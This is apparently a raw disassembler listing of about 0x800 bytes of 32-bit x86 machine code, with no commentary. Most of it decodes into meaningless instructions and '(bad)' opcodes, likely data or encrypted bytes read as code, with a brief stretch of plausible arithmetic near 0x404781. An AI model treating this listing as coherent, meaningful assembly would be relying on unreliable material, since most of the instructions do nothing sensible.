  4042c1:	test   DWORD PTR [esi+edi*1-0x5b],edx
  4042c5:	fcom   QWORD PTR [edx+ebp*1]
  4042c8:	pop    ebx
  4042c9:	std    
  4042ca:	loope  0x404259
  4042cc:	(bad)  
  4042cd:	nop
  4042ce:	cdq    
  4042cf:	dec    eax
  4042d0:	dec    esp
  4042d1:	cs mov eax,eax
  4042d4:	mov    bl,0xfc
  4042d6:	pop    ds
  4042d7:	mov    BYTE PTR [edx+0x2e],ch
  4042da:	dec    esi
  4042db:	daa    
  4042dc:	sub    eax,0xf0ce2655
  4042e1:	xor    esp,esp
  4042e3:	push   esp
  4042e4:	lods   eax,DWORD PTR ds:[esi]
  4042e5:	arpl   WORD PTR [eax-0x49],sp
  4042e8:	cmp    eax,0x95113995
  4042ed:	fadd   DWORD PTR [ecx+0x39]
  4042f0:	or     ah,BYTE PTR [eax+ebp*8+0x5]
  4042f4:	stos   DWORD PTR es:[edi],eax
  4042f5:	cs xchg edi,eax
  4042f7:	lds    edx,FWORD PTR [ebx]
  4042f9:	or     DWORD PTR [edi],esi
  4042fb:	adc    al,0xfb
  4042fd:	ds das 
  4042ff:	sbb    eax,0x51a76dcf
  404304:	adc    ecx,eax
  404306:	gs jge 0x4042b0
  404309:	xchg   cl,cl
  40430b:	nop
  40430c:	pusha  
  40430d:	fsub   QWORD PTR [ebx+0xb]
  404310:	cmp    BYTE PTR [edx+eax*8+0x4],ch
  404314:	adc    al,0xdf
  404316:	rol    BYTE PTR [eax+eax*4+0x2e],cl
  40431a:	pmulhuw mm0,QWORD PTR [esi-0xf]
  40431e:	push   ds
  40431f:	pop    ebp
  404320:	in     eax,0x49
  404322:	sub    BYTE PTR [ebx+0x7ea851f9],ah
  404328:	or     ecx,DWORD PTR [edi-0x6660e136]
  40432e:	xor    ah,dh
  404330:	fld    QWORD PTR [ecx+edi*8]
  404333:	leave  
  404334:	stos   BYTE PTR es:[edi],al
  404335:	int    0xda
  404337:	out    0xdb,eax
  404339:	push   DWORD PTR [ebx-0x7]
  40433c:	fsub   st,st(4)
  40433e:	xor    BYTE PTR [ebx],bl
  404340:	scas   al,BYTE PTR es:[edi]
  404341:	or     eax,0x6e8e4813
  404346:	arpl   WORD PTR [ebx+0x1c],dx
  404349:	mov    ds:0xed7fe19b,al
  40434e:	push   edx
  40434f:	mov    bl,0x3f
  404351:	xchg   edx,eax
  404352:	stos   BYTE PTR es:[edi],al
  404353:	push   ecx
  404354:	pop    eax
  404355:	mov    ebp,DWORD PTR [ecx-0x6]
  404358:	inc    dl
  40435a:	and    DWORD PTR [edx],edi
  40435c:	jns    0x404344
  40435e:	fcomp  DWORD PTR [edi-0x2a]
  404361:	inc    ebx
  404362:	pop    ss
  404363:	sub    al,0x32
  404365:	clc    
  404366:	fstp   QWORD PTR [eax+0x24]
  404369:	loop   0x4043bb
  40436b:	mov    ds:0x673a7eab,eax
  404370:	call   0x710e5508
  404375:	and    edi,DWORD PTR [esi+eiz*1-0x12]
  404379:	xchg   esp,eax
  40437a:	mov    esi,DWORD PTR [ecx+ebx*4-0x16c8dd94]
  404381:	sti    
  404382:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404383:	cmp    al,0x7a
  404385:	xchg   edx,eax
  404386:	mov    dl,BYTE PTR [ebx+0x41af7604]
  40438c:	jns    0x40438c
  40438e:	ficomp DWORD PTR [esi+0x3a620a73]
  404394:	stos   DWORD PTR es:[edi],eax
  404395:	leave  
  404396:	jo     0x404355
  404398:	iret   
  404399:	jnp    0x40438c
  40439b:	inc    esp
  40439c:	mov    ebp,0xe21f36b1
  4043a1:	loop   0x4043da
  4043a3:	fdivr  DWORD PTR [edx]
  4043a5:	jecxz  0x40433d
  4043a7:	mov    bl,BYTE PTR [ebx]
  4043a9:	or     DWORD PTR [edi],esp
  4043ab:	ds push esi
  4043ad:	aas    
  4043ae:	mov    eax,0x13be2d30
  4043b3:	push   eax
  4043b4:	js     0x404344
  4043b6:	shr    BYTE PTR [edi-0x15],cl
  4043b9:	int3   
  4043ba:	pop    es
  4043bb:	mov    al,ds:0xa6a0ce3c
  4043c0:	popa   
  4043c1:	adc    edi,ebx
  4043c3:	aas    
  4043c4:	ins    DWORD PTR es:[edi],dx
  4043c5:	and    dl,BYTE PTR ds:[edx+eiz*1-0x40a0751b]
  4043cd:	sbb    dh,dh
  4043cf:	inc    esi
  4043d0:	fld    TBYTE PTR [esi+edx*4+0x3cd7fdaf]
  4043d7:	clc    
  4043d8:	mov    BYTE PTR [eax],cl
  4043da:	pop    edi
  4043db:	and    bh,BYTE PTR [edx-0x2ef2fad0]
  4043e1:	out    dx,eax
  4043e2:	cmp    BYTE PTR ds:0x9bbbd9c2,bl
  4043e8:	sbb    DWORD PTR [ebp+0x560cae80],esi
  4043ee:	jno    0x4043cc
  4043f0:	sti    
  4043f1:	fnstsw WORD PTR ds:[eax+edi*2-0x129c1337]
  4043f9:	sbb    dh,BYTE PTR [esi-0x603d3a44]
  4043ff:	sbb    ebp,DWORD PTR fs:[edx+eiz*8-0x56]
  404404:	xor    esi,esi
  404406:	mov    ch,0x2a
  404408:	sbb    ch,ah
  40440a:	mov    ah,0x33
  40440c:	mov    esi,0x7cd1282a
  404411:	adc    al,0x8b
  404413:	shr    BYTE PTR ds:0xbcf745d1,1
  404419:	jge    0x40442c
  40441b:	shl    edi,cl
  40441d:	dec    ebx
  40441e:	clc    
  40441f:	hlt    
  404420:	loopne 0x404480
  404422:	sbb    DWORD PTR [ebx-0x78],edx
  404425:	test   al,0x49
  404427:	rol    bh,cl
  404429:	ja     0x4043ed
  40442b:	sbb    bh,BYTE PTR [esp+ebp*8-0x7e716e42]
  404432:	mov    ds:0x7fc9e34d,al
  404437:	and    esp,ecx
  404439:	jp     0x404498
  40443b:	xor    ebp,ecx
  40443d:	add    DWORD PTR [ecx+edx*4+0x579a333b],edi
  404444:	mov    al,0x3c
  404446:	add    ah,BYTE PTR [eax]
  404448:	add    dh,ah
  40444a:	adc    DWORD PTR [ecx],esp
  40444c:	push   ebx
  40444d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40444e:	jns    0x40444b
  404450:	jmp    0x404460
  404452:	aaa    
  404453:	mov    al,0x5
  404455:	or     BYTE PTR [edx+esi*1+0x20],bl
  404459:	aad    0x6a
  40445b:	rol    BYTE PTR [esi],cl
  40445d:	cmp    BYTE PTR [eax-0x2f],cl
  404460:	pop    eax
  404461:	jge    0x404404
  404463:	imul   DWORD PTR ds:0x67ad3678
  404469:	dec    edi
  40446a:	inc    dl
  40446c:	fs out dx,eax
  40446e:	rcr    bh,0x4d
  404471:	xchg   BYTE PTR [edx-0x70aa9eb6],dh
  404477:	stc    
  404478:	inc    edi
  404479:	pusha  
  40447a:	div    BYTE PTR gs:[ebx]
  40447d:	clc    
  40447e:	jmp    0x404781
  404483:	add    bl,BYTE PTR [ebp+0x44]
  404486:	dec    ecx
  404487:	popa   
  404488:	jno    0x40449d
  40448a:	jne    0x4044e2
  40448c:	xor    al,0xa0
  40448e:	jle    0x4044f1
  404490:	arpl   WORD PTR cs:[ecx],si
  404493:	pop    esi
  404494:	sbb    BYTE PTR [esi+0x7e],bh
  404497:	pop    eax
  404498:	jl     0x404518
  40449a:	jle    0x404498
  40449c:	dec    edx
  40449d:	lods   al,BYTE PTR ds:[esi]
  40449e:	push   edi
  40449f:	mov    ebp,0x9864844c
  4044a4:	push   ebp
  4044a5:	sbb    DWORD PTR ds:0xc841801a,eax
  4044ab:	cmp    eax,0x4d85b5e6
  4044b0:	inc    esi
  4044b1:	leave  
  4044b2:	mov    esi,0x20562c1f
  4044b7:	cmp    al,0xe2
  4044b9:	push   edi
  4044ba:	outs   dx,BYTE PTR ds:[esi]
  4044bb:	rol    DWORD PTR [edi-0x6a],0xd
  4044bf:	cmp    esp,ebx
  4044c1:	push   edx
  4044c2:	mov    esp,0x84e24303
  4044c7:	xor    DWORD PTR [edx],0xda421d25
  4044cd:	stos   DWORD PTR es:[edi],eax
  4044ce:	pushf  
  4044cf:	fwait
  4044d0:	cmp    al,dh
  4044d2:	in     eax,dx
  4044d3:	inc    ecx
  4044d4:	hlt    
  4044d5:	mov    ebx,0x31975700
  4044da:	arpl   WORD PTR [edi+0x47],sp
  4044dd:	dec    eax
  4044de:	in     al,dx
  4044df:	mov    ecx,0xa3c64375
  4044e4:	push   ss
  4044e5:	mov    cl,0xd1
  4044e7:	dec    esp
  4044e8:	sahf   
  4044e9:	ror    cl,0x16
  4044ec:	mov    al,ds:0x4bd24a77
  4044f1:	jmp    0x4044ca
  4044f3:	cs fs push cs
  4044f6:	mov    ds:0x162372fd,eax
  4044fb:	int3   
  4044fc:	xlat   BYTE PTR ds:[ebx]
  4044fd:	push   esp
  4044fe:	push   ecx
  4044ff:	enter  0xe5f,0xfa
  404503:	push   ecx
  404504:	ss push cs
  404506:	push   ebx
  404507:	cs pop ds
  404509:	mov    dh,0xfc
  40450b:	pusha  
  40450c:	jp     0x404530
  40450e:	ja     0x4044bb
  404510:	and    ebx,eax
  404512:	push   ecx
  404513:	add    eax,0xb6400a15
  404518:	jnp    0x40451e
  40451a:	fmul   QWORD PTR [eax]
  40451c:	fcomip st,st(7)
  40451e:	xor    ebp,ebx
  404520:	pushf  
  404521:	(bad)  
  404522:	xlat   BYTE PTR ds:[ebx]
  404523:	call   0x98e77ead
  404528:	mov    ah,0x52
  40452a:	mov    eax,DWORD PTR [ebx+0x33]
  40452d:	aaa    
  40452e:	(bad)  
  40452f:	dec    edi
  404530:	fs adc al,0xe7
  404533:	add    DWORD PTR [ecx+0x44afcf42],0x3f
  40453a:	sub    DWORD PTR [eax+0x10e3fff5],ebx
  404540:	(bad)  
  404541:	sbb    bh,BYTE PTR [ebp+0x3c]
  404544:	imul   edi,esi,0xffffffa7
  404547:	imul   ebp,DWORD PTR [ebp+0x7b],0xffffffe3
  40454b:	ins    BYTE PTR es:[edi],dx
  40454c:	das    
  40454d:	add    esi,DWORD PTR [eax+0x65]
  404550:	pop    ecx
  404551:	jl     0x4044e8
  404553:	pop    ss
  404554:	cmp    ah,BYTE PTR [eax-0x69]
  404557:	mov    esi,0x2de473c6
  40455c:	sub    BYTE PTR [edi-0x9],cl
  40455f:	and    al,0x3e
  404561:	push   ecx
  404562:	or     DWORD PTR [ebp-0x6f],ecx
  404565:	call   0xbf20e2a2
  40456a:	jbe    0x404590
  40456c:	nop
  40456d:	mov    eax,ds:0x29e79b8c
  404572:	test   BYTE PTR [ebx-0x2c],bl
  404575:	jp     0x40452b
  404577:	std    
  404578:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404579:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40457a:	out    dx,al
  40457b:	test   ch,0x7b
  40457e:	fdiv   QWORD PTR [ebx-0x93e0db0]
  404584:	mov    bh,0x72
  404586:	sti    
  404587:	pop    esp
  404588:	adc    DWORD PTR [edi+0x865a953],esp
  40458e:	popa   
  40458f:	bound  esi,QWORD PTR [eax-0x608f1ba3]
  404595:	lock mov ah,0x3f
  404598:	cld    
  404599:	push   esi
  40459a:	jl     0x404557
  40459c:	mov    dl,0x5c
  40459e:	das    
  40459f:	cmp    eax,0xe5174e3a
  4045a4:	push   eax
  4045a5:	enter  0xc085,0xbd
  4045a9:	jecxz  0x404563
  4045ab:	stc    
  4045ac:	fbld   TBYTE PTR [edi]
  4045ae:	or     DWORD PTR [eax-0x7aab6805],edx
  4045b4:	xchg   dl,cl
  4045b6:	repnz inc ebx
  4045b8:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  4045ba:	loope  0x40459c
  4045bc:	in     eax,dx
  4045bd:	(bad)  
  4045be:	rcl    BYTE PTR [eax],cl
  4045c0:	cli    
  4045c1:	add    al,0x8d
  4045c3:	adc    DWORD PTR [edi+0x7a82a741],ebx
  4045c9:	fiadd  WORD PTR [ecx-0xf]
  4045cc:	or     DWORD PTR [edx-0xbd3b20a],ebx
  4045d2:	xchg   esi,eax
  4045d3:	mov    ah,0xc5
  4045d5:	arpl   WORD PTR [edx-0x2d],dx
  4045d8:	or     al,0xff
  4045da:	cmp    eax,0x2fa30c1a
  4045df:	cmp    edx,DWORD PTR [edx-0x35512b5d]
  4045e5:	sub    DWORD PTR [edx],ebp
  4045e7:	loop   0x4045f8
  4045e9:	unpckhps xmm1,XMMWORD PTR [edx+0x15]
  4045ed:	mov    eax,ds:0xf5886b1e
  4045f2:	fs cwde 
  4045f4:	das    
  4045f5:	aam    0x25
  4045f7:	sbb    al,0xc
  4045f9:	jb     0x40463b
  4045fb:	sub    eax,0x514f3319
  404600:	aas    
  404601:	in     eax,dx
  404602:	rcl    DWORD PTR [ebp+0x19],cl
  404605:	jl     0x40466e
  404607:	xchg   edx,eax
  404608:	stos   DWORD PTR es:[edi],eax
  404609:	pop    ebp
  40460a:	jecxz  0x404612
  40460c:	add    BYTE PTR [esi+0x0],ah
  40460f:	fnstcw WORD PTR [esi+0x22d21be2]
  404615:	cmp    ch,BYTE PTR [edx]
  404617:	mov    ?,WORD PTR [edx+ecx*4+0x6e4cde63]
  40461e:	pop    ss
  40461f:	mov    ch,0x46
  404621:	gs iret 
  404623:	test   DWORD PTR [eax+0x45],eax
  404626:	enter  0xfae4,0xca
  40462a:	sub    bl,BYTE PTR [di]
  40462d:	(bad)
  404631:	shl    BYTE PTR [edi+ecx*8],cl
  404634:	xlat   BYTE PTR ds:[ebx]
  404635:	ficom  WORD PTR [edx+0x17]
  404638:	dec    edx
  404639:	int    0x3e
  40463b:	jbe    0x404600
  40463d:	jmp    0x3cd32b
  404642:	and    edi,esp
  404644:	sbb    esp,DWORD PTR [ebx]
  404646:	add    al,0x55
  404648:	mov    fs,WORD PTR [esi+ebx*1-0x508054cd]
  40464f:	bound  edx,QWORD PTR [edx+0x2b3136c8]
  404655:	mov    edx,0x2439d740
  40465a:	jmp    0x404646
  40465c:	mov    edi,0x51e332b5
  404661:	outs   dx,DWORD PTR ds:[esi]
  404662:	(bad)  
  404663:	call   DWORD PTR [ebp+edx*1+0x25]
  404667:	jno    0x4046d3
  404669:	gs xchg edi,eax
  40466b:	inc    ebx
  40466c:	aam    0x21
  40466e:	es cwde 
  404670:	daa    
  404671:	push   ds
  404672:	pop    esp
  404673:	and    DWORD PTR [eax+0x65],0xb5d186eb
  40467a:	mov    edx,0x75a95554
  40467f:	ins    BYTE PTR es:[edi],dx
  404680:	jmp    0x44c9fd07
  404685:	push   0x1b
  404687:	mov    DWORD PTR [ecx+0x3bd3d629],esp
  40468d:	loope  0x404630
  40468f:	mov    ds:0x906d6c03,eax
  404694:	xor    eax,0xff2b9642
  404699:	ja     0x40464f
  40469b:	outs   dx,DWORD PTR ds:[esi]
  40469c:	sub    ebx,DWORD PTR [ebx-0x70]
  40469f:	lahf   
  4046a0:	pop    ds
  4046a1:	out    dx,eax
  4046a2:	mov    al,0x22
  4046a4:	adc    eax,0x19ece125
  4046a9:	cmp    eax,0x1655870
  4046ae:	push   es
  4046af:	adc    al,dl
  4046b1:	push   edx
  4046b2:	stc    
  4046b3:	(bad)  
  4046b4:	dec    edi
  4046b5:	jp     0x404706
  4046b7:	mov    eax,ds:0xb11b35b2
  4046bc:	lahf   
  4046bd:	dec    esp
  4046be:	or     ch,BYTE PTR [esi+0x78c4612]
  4046c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4046c5:	cmp    DWORD PTR [ecx],0xffffffc3
  4046c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4046c9:	and    dl,bh
  4046cb:	jb     0x4046e8
  4046cd:	xor    ebx,edx
  4046cf:	test   eax,0x3a69b4cf
  4046d4:	or     eax,0x8c47db3b
  4046d9:	pop    ebx
  4046da:	mov    dl,0xb6
  4046dc:	sbb    dh,BYTE PTR [esi+esi*4+0x3538954c]
  4046e3:	cs ds adc bl,ch
  4046e7:	inc    ebx
  4046e8:	jnp    0x4046b0
  4046ea:	inc    esi
  4046eb:	pop    ecx
  4046ec:	fstp   TBYTE PTR [esp+ebp*1+0x76]
  4046f0:	lds    ecx,FWORD PTR ds:0x49f4a3d5
  4046f6:	jne    0x4046b9
  4046f8:	add    al,0xde
  4046fa:	js     0x4046ae
  4046fc:	cmc    
  4046fd:	das    
  4046fe:	cld    
  4046ff:	mov    ds:0x825feff5,eax
  404704:	test   DWORD PTR [ebx-0x31310628],esi
  40470a:	call   0xbbe:0x92992435
  404711:	addr16 push eax
  404713:	call   0xb280ba49
  404718:	sbb    al,0x6e
  40471a:	sahf   
  40471b:	cwde   
  40471c:	fsubr  DWORD PTR [esi+ebp*2-0x65b3f073]
  404723:	sub    esi,DWORD PTR es:[ebp+0x20]
  404727:	out    0x4d,eax
  404729:	jmp    0x34aea2b8
  40472e:	cmp    eax,0x1718e42e
  404733:	mov    ch,0x69
  404735:	idiv   BYTE PTR [ecx+0x2c]
  404738:	push   esi
  404739:	or     ebp,ecx
  40473b:	push   ss
  40473c:	sub    al,0xb
  40473e:	mov    DWORD PTR [ecx],esp
  404740:	pop    esp
  404741:	lahf   
  404742:	ins    DWORD PTR es:[edi],dx
  404743:	push   ebp
  404744:	sbb    ebp,DWORD PTR [edx+esi*4-0x2cf4b9be]
  40474b:	mov    ds:0x3cc463ad,al
  404750:	add    eax,0xda9e6e63
  404755:	stc    
  404756:	and    eax,0x367841f4
  40475b:	cli    
  40475c:	push   edx
  40475d:	mov    bh,0x51
  40475f:	pusha  
  404760:	out    0xad,eax
  404762:	push   edx
  404763:	mov    al,0x2c
  404765:	cwde   
  404766:	push   0x5d4570d2
  40476b:	stos   DWORD PTR es:[edi],eax
  40476c:	stc    
  40476d:	enter  0x6521,0xe0
  404771:	ret    
  404772:	cmp    BYTE PTR [esi],bh
  404774:	mov    ah,0x67
  404776:	stos   BYTE PTR es:[edi],al
  404777:	mov    es,WORD PTR [edx*8+0x6c8908fc]
  40477e:	retf   0x8ca2
  404781:	xor    edx,eax
  404783:	add    edi,ecx
  404785:	add    edx,ecx
  404787:	imul   edx,edi
  40478a:	mov    DWORD PTR [ebp+0xc],edx
  40478d:	mov    edx,DWORD PTR [ebp+0xc]
  404790:	mov    DWORD PTR [ebp-0x24],edx
  404793:	mov    edx,DWORD PTR [ebp-0x8]
  404796:	add    edx,DWORD PTR [ebp-0x40]
  404799:	mov    DWORD PTR [ebp-0x18],0xf89c8531
  4047a0:	mov    DWORD PTR [ebp-0x1c],edx
  4047a3:	jmp    0x404aa6
  4047a8:	sub    ch,BYTE PTR [eax+edi*1+0x6b69b8ad]
  4047af:	test   eax,0xf2c2fa45
  4047b4:	jge    0x40473a
  4047b6:	mov    ebp,0x7e27b876
  4047bb:	jle    0x404815
  4047bd:	jl     0x40483d
  4047bf:	jle    0x4047df
  4047c1:	in     eax,dx
  4047c2:	imul   ecx,DWORD PTR [ebp-0x7700bd8a],0x57bebb5
  4047cc:	sub    BYTE PTR [eax-0x62],0x0
  4047d0:	es test al,dh
  4047d3:	gs push 0xff34e14a
  4047d9:	mov    ch,0xc5
  4047db:	retf   0x52b0
  4047de:	popf   
  4047df:	inc    ebx
  4047e0:	sbb    ebx,edx
  4047e2:	adc    esi,ecx
  4047e4:	fistp  QWORD PTR [eax]
  4047e6:	jae    0x40483f
  4047e8:	addr16 mov esi,0x3bb3493b
  4047ee:	arpl   WORD PTR [edi-0x4f581c94],dx
  4047f4:	in     eax,0x2a
  4047f6:	call   0x1524:0x74c82fe9
  4047fd:	dec    edx
  4047fe:	push   esi
  4047ff:	push   edx
  404800:	ins    BYTE PTR es:[edi],dx
  404801:	pop    ecx
  404802:	push   esi
  404803:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404804:	push   esp
  404805:	inc    esi
  404806:	mov    edx,0x355dd03e
  40480b:	pop    eax
  40480c:	and    WORD PTR [edx-0x63],bp
  404810:	stc    
  404811:	add    eax,ebx
  404813:	scas   eax,DWORD PTR es:[edi]
  404814:	leave  
  404815:	or     DWORD PTR [edi+0x37dfbb8a],esi
  40481b:	pop    edx
  40481c:	(bad)  
  40481d:	out    0x66,al
  40481f:	clc    
  404820:	lahf   
  404821:	xor    BYTE PTR [eax+0x592c4217],cl
  404827:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404828:	or     al,0xf0
  40482a:	adc    ebx,edi
  40482c:	ret    
  40482d:	add    eax,0x4e2936f
  404832:	pop    esi
  404833:	push   ebp
  404834:	test   al,0x0
  404836:	hlt    
  404837:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404838:	neg    bh
  40483a:	aam    0x53
  40483c:	push   eax
  40483d:	imul   ecx,DWORD PTR [ecx+0x6],0xffffff88
  404841:	leave  
  404842:	push   ecx
  404843:	cmp    al,0x8
  404845:	adc    al,0x18
  404847:	in     al,0xd4
  404849:	test   eax,0xbfcab36c
  40484e:	sbb    al,0x13
  404850:	and    DWORD PTR [edx],ecx
  404852:	fidiv  WORD PTR [eax-0x6207786f]
  404858:	sub    BYTE PTR [edx+0x51c89bf4],al
  40485e:	mov    al,0xf5
  404860:	dec    eax
  404861:	mov    ch,BYTE PTR [esi]
  404863:	popf   
  404864:	fst    QWORD PTR [ecx]
  404866:	mov    bl,0x97
  404868:	rcr    DWORD PTR [edx-0x607a4bf5],cl
  40486e:	mov    BYTE PTR [edi+0x24717082],ah
  404874:	jp     0x4048e0
  404876:	cdq    
  404877:	sbb    cl,bh
  404879:	pop    ebp
  40487a:	ds push eax
  40487c:	mov    eax,ds:0x8a13dfd9
  404881:	ret    0x7a9a
  404884:	(bad)  
  404885:	push   ebp
  404886:	ins    BYTE PTR es:[edi],dx
  404887:	mov    ebx,0xaa77c0dc
  40488c:	popa   
  40488d:	loopne 0x40485e
  40488f:	cld    
  404890:	loop   0x404871
  404892:	dec    esp
  404893:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404894:	sti    
  404895:	cmp    ebp,DWORD PTR [ebp-0x32]
  404898:	adc    DWORD PTR [esi],ecx
  40489a:	sub    edx,DWORD PTR [esi+0x4ac60857]
  4048a0:	mov    dh,0xcc
  4048a2:	dec    eax
  4048a3:	(bad)  
  4048a4:	shl    BYTE PTR [esp+ebp*8-0x22],0x74
  4048a9:	inc    edi
  4048aa:	fist   WORD PTR [ecx-0x22]
  4048ad:	scas   eax,DWORD PTR es:[edi]
  4048ae:	sub    bh,bh
  4048b0:	(bad)  
  4048b2:	xchg   ebx,eax
  4048b3:	push   0x8ae61fa3
  4048b8:	pop    esp
  4048b9:	cld    
  4048ba:	lea    edi,[esi+0x7a413f58]
  4048c0:	fld    st(1)
  4048c2:	xchg   ebp,eax
  4048c3:	pushw  0x8aee
  4048c7:	pop    esi
  4048c8:	pushf  
  4048c9:	xchg   edx,eax
  4048ca:	and    bh,BYTE PTR [ebx-0x3c]
  4048cd:	mov    ds:0x65c9a1a4,eax
  4048d2:	mov    esi,0x9a1efe00
  4048d7:	lods   eax,DWORD PTR ds:[esi]
  4048d8:	jbe    0x40494f
  4048da:	mov    bl,0x9e
  4048dc:	int3   
  4048dd:	mov    eax,0x392162ec
  4048e2:	xlat   BYTE PTR ds:[ebx]
  4048e3:	mov    eax,ds:0xa4e0d09b
  4048e8:	mov    bl,0xeb
  4048ea:	sbb    BYTE PTR [eax+0x3c],cl
  4048ed:	fsub   DWORD PTR [esi+0x5e5bb8bd]
  4048f3:	pop    edx
  4048f4:	cmp    cl,al
  4048f6:	je     0x40490a
  4048f8:	mov    WORD PTR [ebp-0x56b8f544],ds
  4048fe:	sub    eax,0x205ebdb8
  404903:	repz or al,0x63
  404906:	out    dx,eax
  404907:	adc    BYTE PTR [edx-0x6b],0x7e
  40490b:	inc    ecx
  40490c:	in     al,0xe1
  40490e:	jecxz  0x4048df
  404910:	cmp    cl,ah
  404912:	adc    DWORD PTR [ebx-0x3bc017c1],esp
  404918:	rcr    ecx,cl
  40491a:	fwait
  40491b:	inc    edx
  40491c:	imul   eax,ecx,0xf29dc871
  404922:	add    eax,0x152a5292
  404927:	or     ebp,edi
  404929:	push   ss
  40492a:	pop    ss
  40492b:	or     al,0xc6
  40492d:	cmp    eax,0xd1a3dadf
  404932:	out    dx,al
  404933:	pop    ds
  404934:	mov    edx,DWORD PTR [ebp-0x6f9bbd62]
  40493a:	add    DWORD PTR [ebx],ebp
  40493c:	sub    eax,0x10cbd9c0
  404941:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404942:	in     al,dx
  404943:	inc    edi
  404944:	cdq    
  404945:	dec    ecx
  404946:	sbb    DWORD PTR [edi+0x1f],edi
  404949:	lods   al,BYTE PTR ds:[esi]
  40494a:	xor    BYTE PTR [edi-0xc],0x8e
  40494e:	xchg   BYTE PTR [eax-0x35aa3f43],ch
  404954:	in     al,dx
  404955:	xchg   edx,eax
  404956:	fs adc eax,0xe383bb0c
  40495c:	sub    eax,0x7057fde2
  404961:	aad    0x5a
  404963:	sub    ch,BYTE PTR [ebx]
  404965:	jmp    0xa7773d83
  40496a:	je     0x404945
  40496c:	lds    ebp,FWORD PTR [eiz*2-0x66726ad4]
  404973:	mov    dl,BYTE PTR [edx-0x55]
  404976:	dec    edi
  404977:	sbb    al,0xf4
  404979:	pop    ecx
  40497a:	clc    
  40497b:	mov    al,BYTE PTR [esi]
  40497d:	mov    gs,WORD PTR [ebx-0x48]
  404980:	ds mov ecx,0xf0193c67
  404986:	stc    
  404987:	mov    ecx,ss
  404989:	mov    ds:0x97da600d,eax
  40498e:	push   esp
  40498f:	sub    al,0x7c
  404991:	jle    0x404932
  404993:	xchg   esp,eax
  404994:	repnz fbld TBYTE PTR [edx+edi*8+0x3b]
  404999:	mov    edx,0xd0919a02
  40499e:	add    BYTE PTR [edi+eiz*2-0x2a34ebae],al
  4049a5:	clc    
  4049a6:	outs   dx,BYTE PTR ds:[esi]
  4049a7:	loopne 0x404a16
  4049a9:	add    BYTE PTR [eax+0x796b6403],ch
  4049af:	out    0x5e,al
  4049b1:	nop
  4049b2:	pop    esp
  4049b3:	adc    DWORD PTR ds:0x55675ce6,edi
  4049b9:	pop    edx
  4049ba:	std    
  4049bb:	imul   ebx,DWORD PTR [edx+ecx*4+0x2975e183],0x57872b03
  4049c6:	pop    edi
  4049c7:	add    al,0x25
  4049c9:	pop    ecx
  4049ca:	push   eax
  4049cb:	dec    ebp
  4049cc:	fdivp  st(7),st
  4049ce:	cdq    
  4049cf:	lods   ax,WORD PTR ds:[esi]
  4049d1:	arpl   WORD PTR [ecx+edi*2+0x794c79e0],si
  4049d8:	inc    ebx
  4049d9:	add    eax,0x31698de3
  4049de:	fmul   st(6),st
  4049e0:	mov    ecx,0xea2c4372
  4049e5:	sub    BYTE PTR [eax+0x2b],dl
  4049e8:	hlt    
  4049e9:	push   ds
  4049ea:	in     eax,0x51
  4049ec:	lods   eax,DWORD PTR ds:[esi]
  4049ed:	inc    ebp
  4049ee:	outs   dx,BYTE PTR ds:[esi]
  4049ef:	popf   
  4049f0:	cli    
  4049f1:	xor    eax,0x99d407d5
  4049f6:	call   0xb965:0x308ff344
  4049fd:	inc    ebp
  4049fe:	popf   
  4049ff:	retf   
  404a00:	stc    
  404a01:	jecxz  0x404a03
  404a03:	scas   eax,DWORD PTR es:[edi]
  404a04:	sub    bh,BYTE PTR [ebp-0x38]
  404a07:	pop    edi
  404a08:	xchg   edi,eax
  404a09:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404a0a:	xchg   edi,ecx
  404a0c:	mov    ecx,0x4df656ec
  404a11:	aam    0xc9
  404a13:	jnp    0x4049ed
  404a15:	stc    
  404a16:	in     al,dx
  404a17:	inc    esi
  404a18:	sub    DWORD PTR [ecx-0x53],0x28
  404a1c:	ficom  DWORD PTR [ebp+0x44]
  404a1f:	out    dx,al
  404a20:	test   ebp,ebx
  404a22:	cmp    DWORD PTR [edi],ecx
  404a24:	gs adc eax,DWORD PTR fs:[esi+0x35a3bb9b]
  404a2c:	mov    eax,ds:0x78794d42
  404a31:	test   al,0x94
  404a33:	into   
  404a34:	daa    
  404a35:	mov    dh,0xc1
  404a37:	xor    BYTE PTR [eax-0x1d],ah
  404a3a:	jecxz  0x404a2c
  404a3c:	push   ds
  404a3d:	(bad)  
  404a3e:	xchg   edi,eax
  404a3f:	je     0x404a15
  404a41:	mov    ch,0x8d
  404a43:	out    dx,al
  404a44:	outs   dx,DWORD PTR ds:[esi]
  404a45:	scas   al,BYTE PTR es:[edi]
  404a46:	sahf   
  404a47:	jb     0x404a30
  404a49:	mov    dh,0x65
  404a4b:	mov    eax,ds:0x6bd59fe7
  404a50:	sbb    al,0x3d
  404a52:	mov    ebp,0x5f77340
  404a57:	push   cs
  404a58:	retf   0x25e0
  404a5b:	mov    WORD PTR [edi-0x3c],cs
  404a5e:	js     0x404ade
  404a60:	pop    edi
  404a61:	jnp    0x404a00
  404a63:	cmp    esi,edx
  404a65:	jno    0x404a75
  404a67:	daa    
  404a68:	imul   esi,DWORD PTR [edi+0x42fbf85f],0x75429a30
  404a72:	test   DWORD PTR [ecx-0x70],eax
  404a75:	push   es
  404a76:	mov    ebx,0x7fb1a79
  404a7b:	push   cs
  404a7c:	std    
  404a7d:	push   0xc8048907
  404a82:	jbe    0x404a38
  404a84:	shl    ebx,cl
  404a86:	push   cs
  404a87:	std    
  404a88:	imul   esp,DWORD PTR [edx],0xe041e283
  404a8e:	bound  eax,QWORD PTR [edx]
  404a90:	cmp    eax,0x1a5b96c4
  404a95:	cwde   
  404a96:	imul   ecx,DWORD PTR [edi],0x33
  404a99:	das    
  404a9a:	inc    esi
  404a9b:	in     al,0x5d
  404a9d:	cmp    al,0xae
  404a9f:	pop    ebx
  404aa0:	mov    cl,0x5e
